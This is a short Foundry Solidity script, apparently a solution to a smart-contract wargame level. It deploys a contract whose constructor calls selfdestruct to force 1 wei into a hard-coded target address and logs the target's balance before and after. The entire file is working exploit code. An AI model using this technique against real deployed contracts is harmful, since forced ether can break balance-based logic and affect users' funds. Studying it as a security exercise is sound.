// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        console.log(0x5Bf9B4736ed7e7D7583f05F0F5eEBc92190E7c9E.balance);
        new ForceAttacker{value: 1 wei}(payable(0x5Bf9B4736ed7e7D7583f05F0F5eEBc92190E7c9E));
        console.log(0x5Bf9B4736ed7e7D7583f05F0F5eEBc92190E7c9E.balance);
        
        vm.stopBroadcast();
    }
}

contract ForceAttacker {

    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
} 